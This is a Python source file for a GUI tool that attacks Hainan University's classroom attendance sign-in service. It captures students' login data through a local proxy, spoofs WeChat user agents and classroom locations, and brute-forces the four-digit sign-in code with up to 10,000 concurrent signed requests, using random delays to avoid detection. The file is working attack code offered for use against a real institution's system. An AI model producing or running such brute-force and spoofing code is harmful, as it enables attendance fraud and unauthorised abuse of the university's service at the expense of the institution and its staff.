# -*- coding: utf-8 -*-
# @Time    : 2026.5.28
# @Author  : xlxlSakura
# @FileName: fuckHNU.py
# @Software: PyCharm
# @Description: FUCK the signing system of HNU and CRACK the sign-token.
# @Version: 0.1

import subprocess
import sys

# 第一时间修补 subprocess，防止后续导入的模块触发错误
if sys.platform.startswith('win'):
    class SafePopen(subprocess.Popen):
        def __init__(self, *args, **kwargs):
            if 'creationflags' not in kwargs:
                kwargs['creationflags'] = 0x08000000
            super().__init__(*args, **kwargs)
    subprocess.Popen = SafePopen

import re
import socket
import threading
import time
import requests
import payLoadsUtils
import signUtils
import getStuInfo
import studentInfo
from datetime import datetime
import webview
import json
import asyncio
import aiohttp
import random
from tqdm.asyncio import tqdm
import winreg
import ctypes
import atexit
import logging
import os

from bottle import Bottle, request, response, template, static_file, post, get, run, TEMPLATE_PATH

serverUrl = "https://ktkq.hainanu.edu.cn/app"

qdkblist = {}
today_schedule = []
cur_student = ""
new_user = None
total_requests = 10000  # 总请求数
concurrent_limit = 40  # 最大并发数
timeout_secs = 10

main_window = None
user_agents = [
    "Mozilla/5.0 (Linux; Android 13; 2211133C Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/5678 MicroMessenger/8.0.40.2420(0x28002837) Process/appbrand2 WeChat/8.0.40 NetType/4G Language/zh_CN ABI/arm64 MiniProgramEnv",
    "Mozilla/5.0 (Linux; Android 12; ABY-AL00 Build/HUAWEIABY-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.114 Mobile Safari/537.36 MMWEBID/1234 MicroMessenger/8.0.42.2460(0x28002A34) Process/appbrand0 WeChat/8.0.42 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2541939) XWEB/19841",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.73(0x18004935) NetType/WIFI Language/zh_CN",
]
stop_event = asyncio.Event()
exploit_token = "000000"
did_adding_users = False

app = Bottle()
base_dir = os.path.dirname(os.path.abspath(__file__))
templates_dir = os.path.join(base_dir, 'templates')
if templates_dir not in TEMPLATE_PATH:
    TEMPLATE_PATH.insert(0, templates_dir)
def render_tpl(name, **kwargs):
    return template(name, **kwargs)

def clean_system_proxy():
    if not did_adding_users: return
    xpath = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, xpath, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)

        # 刷新系统设置
        ctypes.windll.wininet.InternetSetOptionW(0, 39, 0, 0)
        ctypes.windll.wininet.InternetSetOptionW(0, 37, 0, 0)
        logging.info("系统代理状态: 关闭")
    except Exception as e:
        logging.error(f"代理配置失败: {e}")

def add_new_user(user_name,user_data):
    try:
        with open(os.path.expandvars(r"%APPDATA%\FuckHNUktkq\studentsInfo.json"), "r", encoding="utf-8") as f:
            old_data = f.read()
        is_old = False
        new_json = json.loads(old_data)
        try:
            if "null" in new_json["users"].keys():
                if new_json["users"]["null"] == "null":
                    new_json["users"].pop("null")
        except:
            pass
        for o in new_json["infos"]:
            if o["userCode"] == user_data["userCode"] and o["userName"] == user_data["userName"]:
                is_old = True
                break
        if is_old : return 2
        new_json["users"][user_name] = user_data["userCode"]
        new_json["infos"].append(user_data)
        with open(os.path.expandvars(r"%APPDATA%\FuckHNUktkq\studentsInfo.json"), "w", encoding="utf-8") as f:
            f.write(json.dumps(new_json, ensure_ascii=False))
        return 1
    except Exception as e:
        logging.debug(e)
        return 0

def send_post(apiurl,postpayload):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(user_agents),
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxa1e3abcd201139a2/35/page-frame.html"
    }
    try:
        response = requests.post(url=serverUrl + "/" + apiurl, data=postpayload, headers=headers, timeout=10)
        response.raise_for_status()
        logging.debug("返回结果:" + response.text)
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"请求发送失败: {e}")

async def send_post_request(target_url, payload, session, semaphore, token):
    global exploit_token
    # 如果已经触发了停止信号，直接退出，不再抢占信号量
    if stop_event.is_set():
        return None
    async with semaphore:  # 使用信号量控制并发
        # 再次检查，防止在排队等待信号量期间触发了停止信号
        if stop_event.is_set():
            return None
        logging.debug(f"do{token}")
        try:
            #随机请求头
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": random.choice(user_agents),
                "Accept-Encoding": "gzip,compress,br,deflate",
                "Referer": "https://servicewechat.com/wxa1e3abcd201139a2/35/page-frame.html"
            }
            #payload签名
            sign = signUtils.getSignAndTimestamp()
            payload["sign"] = sign[0]
            payload["timestamp"] = sign[1]
            payload["kl"] = token
            #jitter-随机微小延迟
            await asyncio.sleep(random.uniform(0.1, 0.4))
            logging.debug(f"payload:{payload}")
            async with session.post(
                target_url,
                data=payload,
                headers=headers,
                timeout=timeout_secs
            ) as response:
                logging.debug(f"responsecode:{response.status},{exploit_token}")
                logging.debug(f"resjson:{await response.json()}")
                if response.status == 200:
                    # 读取并解析 JSON
                    try:
                        res_json = await response.json()
                        logging.debug(res_json)
                        logging.debug(f"response:{res_json.get("status")},{exploit_token}")
                        if res_json.get("status") == 1:
                            logging.info(f"\n命中目标！签到码为：{token} 。正在停止后续任务...")
                            exploit_token = token
                            stop_event.set()  # 触发全局停止信号
                            return "STOPPED"

                    except Exception as json_err:
                        # 预防服务器返回的不是标准的JSON
                        pass

                return response.status

        except Exception as e:
            return f"Error: {e}"

def signWithCode(student, classId, code, location):
    global qdkblist, today_schedule
    pl = payLoadsUtils.process_GetXsQdInfo(student,qdkblist[classId])
    logging.debug("getXsQdInfo" + str(pl))

    signInfoResult = send_post("getXsQdInfo", pl)
    time.sleep(random.uniform(0.2, 0.4))
    pl1 = payLoadsUtils.process_GetGpsWzJl(student,qdkblist[classId]["qdId"],location)
    logging.debug("getGpsWzJl" + str(pl1))
    distanceResult = send_post("getGpsWzJl", pl1)

    if float(distanceResult["wzJl"]) < 350.0 and distanceResult["status"] == 1:
        logging.info(f"距离验证成功，距离{distanceResult["wzJl"]}")
    else:
        logging.info(f"距离验证失败，距离{distanceResult["wzJl"]}")
        return 2

    time.sleep(random.uniform(0.2, 0.4))
    pl2 = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],code,location)
    logging.debug("saveXsQdInfo" + str(pl2))
    signResult = send_post("saveXsQdInfo", pl2)

    if signResult["status"] == "6":
        logging.info("签到异常")
        return 3
    elif signResult["msg"] != "签到成功": ######判断根据不准确 没抓到签到码错误的包。。。
        logging.info("签到码错误")
        return 4
    logging.info("签到成功")
    return 1

async def signWithoutCode(student, classId, location):
    # 限制同时运行的任务数量
    semaphore = asyncio.Semaphore(concurrent_limit)
    url = serverUrl + "/saveXsQdInfo"
    payload = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],"0000",location)
    exploit_token = "000000"
    logging.debug("start sign without code")
    # 使用 ClientSession 复用连接池
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(total_requests):
            # 创建任务
            token = str(i).zfill(4)
            task = asyncio.ensure_future(send_post_request(url, payload.copy(), session, semaphore, token))
            tasks.append(task)

        pbar = tqdm(total=total_requests, desc="爆破中")
        count = 0

        # 结果处理循环
        for f in asyncio.as_completed(tasks):
            res = await f
            count += 1
            pbar.update(1)

            # 每完成 20 个请求更新一次 UI，避免频繁调用 JS 导致卡顿
            if count % 20 == 0  or count == total_requests:
                progress_msg = f"正在尝试: {count}/10000 (当前码: {str(count).zfill(4)})"
                if main_window:
                    # 调用前端定义的 JS 函数 updateProgressBar
                    main_window.evaluate_js(f"updateProgressBar({count}, {total_requests}, '{progress_msg}')")

            if stop_event.is_set() or exploit_token != "000000" or res == "STOPPED":
                if main_window:
                    main_window.evaluate_js(
                        f"updateProgressBar({total_requests}, {total_requests}, '爆破成功！签到码为：{exploit_token}')")
                for t in tasks:
                    if not t.done(): t.cancel()
                break

        pbar.close()

@app.route('/')
def index():
    users = studentInfo.get_users().keys()
    refreshClasses(request.query.user if request.query.user else list(users)[0])

    now = datetime.now()
    date_str = now.strftime("%Y年%m月%d日")
    time_str = now.strftime("%H:%M:%S")
    week_list = ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期日"]
    weekday_str = week_list[now.weekday()]
    return render_tpl('index.html',all_users=users,current_user=cur_student, schedule=today_schedule, today_date=date_str, today_time=time_str, weekday=weekday_str)

@app.route('/signin/<course_id:int>')
def signin_page(course_id):
    course = next((item for item in today_schedule if item["id"] == course_id), None)
    if course:
        reloc = "3号教学楼"
        match = re.search(r"\)(\d{1,2})\-", today_schedule[course_id]["location"])
        if match: reloc = match.group(1) + "号教学楼"
        elif "实验" in today_schedule[course_id]["location"]: reloc = "实验楼"
        elif "第一运动" in today_schedule[course_id]["location"]: reloc = "一田"
        elif "第二运动" in today_schedule[course_id]["location"]: reloc = "二田"

        return render_tpl('signin.html', course=course, locations=payLoadsUtils.location_options.keys(), recommend_loc=reloc)
    return "课程未找到", 404


@app.post('/do_signin/<course_id:int>')
def do_signin(course_id):
    selected_location = request.form.get('location')
    has_code = request.form.get('has_code')
    signin_code = request.form.get('signin_code')

    if has_code:
        if not signin_code or not re.match(r'^\d{4}$', signin_code):
            return "提交失败：签到码格式不正确（必须为4位数字）", 400

    logging.info(f"---- 签到请求 ----")
    logging.info(f"课程ID: {course_id}")
    logging.info(f"确认地点: {selected_location}")
    logging.info(f"是否有签到码: {'是' if has_code else '否'}")
    if has_code:
        logging.info(f"签到码内容: {signin_code}")
    logging.info(f"----------------")

    if has_code:
        status = signWithCode(cur_student, course_id, signin_code, selected_location)
        if status != 1:
            if status == 4:
                return {"status": "warning", "message": f"签到失败！签到码错误。"}
            return {"status": "error", "message": f"签到失败！错误码：{status}"}
    else:
        try:
            asyncio.run(signWithoutCode(cur_student,course_id, selected_location))
        except Exception:
            return {"status": "error", "message": f"签到失败！错误码：7"}

    for course in today_schedule:
        if course["id"] == course_id:
            course["status"] = "已签到"
            break
    return {"status": "success", "message": "签到成功！"}

@app.post('/upload')
def receive_data():
    global new_user
    if main_window:
        main_window.evaluate_js("updateLoadingStatus('抓包成功，正在保存用户信息...')")
    data = payLoadsUtils.process_GetUserOpenId(request.json)
    logging.debug(f"收到新用户数据: {data}")
    if new_user:
        stat = add_new_user(new_user,data)
    clean_system_proxy()
    if stat == 1:
        if main_window:
            main_window.evaluate_js(f"showResult('success', '添加成功', '用户 {new_user} 已成功导入！')")
    elif stat == 2:
        if main_window:
            main_window.evaluate_js(f"showResult('warning', '添加失败', '用户 {studentInfo.getStudentInfoByCode(data["userCode"])["userName"]} 已存在！')")
    else:
        if main_window:
            main_window.evaluate_js("showResult('error', '添加失败', '保存文件时发生错误')")

    return {"status": "success"}

@app.post('/add_user')
def add_user():
    global new_user, did_adding_users
    data = request.json
    new = data.get('username')
    if new in studentInfo.get_users().keys(): return {"status": "error", "message": "用户已存在"}, 400
    did_adding_users = True
    if new:
        logging.info(f"收到新增用户请求: {new}")
        new_user = new
        daemon = threading.Thread(target=getStuInfo.runProxy,kwargs={'upload_port': str(my_port)}, daemon=True)
        daemon.start()
        if main_window:
            main_window.evaluate_js(f"updateLoadingStatus('正在部署抓包环境...')")
        time.sleep(4.5)
        if main_window:
            main_window.evaluate_js(f"updateLoadingStatus('抓包环境已就绪，请在小程序中点击登录...')")
        return {"status": "success", "message": "正在抓包"}
    return {"status": "error", "message": "用户名不能为空"}, 400

def refreshClasses(student):
    global qdkblist, today_schedule, cur_student
    cur_student = student
    if student == "null" and studentInfo.get_users()[student] == "null":
        ctypes.windll.user32.MessageBoxW(0, "请先添加用户！", "提示", 0)
        return
    qdkblist = payLoadsUtils.process_GetQdKbList(send_post("getQdKbList", payLoadsUtils.getStudentClassesPayload(student)))
    today_schedule = []

    for lec in qdkblist:
        lec_info = {"id": qdkblist.index(lec)}
        isSigned, isSigning, isSignClose, isOnline, isLate = False,False,False,False,False
        for i in lec:
            if i == "kcMc":
                lec_info["name"] = lec[i]
            elif i == "xsQdQkMc":
                if lec[i] == "已签": isSigned = True
                if lec[i] == "迟到":
                    isSigned = True
                    isLate = True
            elif i == "qdQkMc":
                if lec[i] == "签到中": isSigning = True
                elif lec[i] == "已结束": isSignClose = True
            elif i == "skXsStr":
                if lec[i] == "线上": isOnline = True
            elif i == "skDd":
                lec_info["location"] = lec[i]
            elif i == "skSj":
                lec_info["time"] = str(lec[i]).split("(")[1].replace(")","")
                lec_info["period"] = str(lec[i]).split("(")[0]
            elif i == "skJs":
                lec_info["teacher"] = lec[i]
        if not isSigned and not isSigning and not isSignClose:
            lec_info["status"] = "签到未开始"
        elif not isSigned and isSigning:
            lec_info["status"] = "可签到"
        elif not isLate and isSigned and isSigning and not isOnline:
            lec_info["status"] = "已签(线下)"
        elif not isLate and isSigned and isSigning and isOnline:
            lec_info["status"] = "已签(线上)"
        elif isLate and isSigned and isSigning and not isOnline:
            lec_info["status"] = "迟到(线下)"
        elif isLate and isSigned and isSigning and isOnline:
            lec_info["status"] = "迟到(线上)"
        elif not isSigned and isSignClose:
            lec_info["status"] = "签到结束(未签)"
        elif not isLate and isSigned and isSignClose and not isOnline:
            lec_info["status"] = "签到结束(已签线下)"
        elif not isLate and isSigned and isSignClose and isOnline:
            lec_info["status"] = "签到结束(已签线上)"
        elif isLate and isSigned and isSignClose and not isOnline:
            lec_info["status"] = "签到结束(迟到线下)"
        elif isLate and isSigned and isSignClose and isOnline:
            lec_info["status"] = "签到结束(迟到线上)"
        today_schedule.append(lec_info)
    logging.debug("today" + str(today_schedule))

def get_free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('127.0.0.1', 0))
    port = s.getsockname()[1]
    s.close()
    return port

def detect_first_run():
    if not os.path.exists(os.path.expandvars(r"%APPDATA%\FuckHNUktkq")):
        os.mkdir(os.path.expandvars(r"%APPDATA%\FuckHNUktkq"))
    if not os.path.isfile(os.path.expandvars(r"%APPDATA%\FuckHNUktkq\studentsInfo.json")):
        brandnew_json = {
            "users":{"null":"null"},
            "infos":[]
        }
        with open(os.path.expandvars(r"%APPDATA%\FuckHNUktkq\studentsInfo.json"), "w", encoding="utf-8") as f:
            f.write(json.dumps(brandnew_json, ensure_ascii=False))

def start_up(port):
    try:
        app.run(port=port, debug=False)
    finally:
        clean_system_proxy()

if __name__ == "__main__":
    detect_first_run()
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        encoding='utf-8',
        filename=os.path.expandvars(r"%APPDATA%\FuckHNUktkq\app.log")
    )
    my_port = get_free_port()
    atexit.register(clean_system_proxy)
    threading.Thread(target=start_up,kwargs={'port': str(my_port)}, daemon=True).start()
    main_window = webview.create_window('海大课堂考勤Pro Max', f'http://127.0.0.1:{my_port}', width=1000, height=600)
    webview.start()

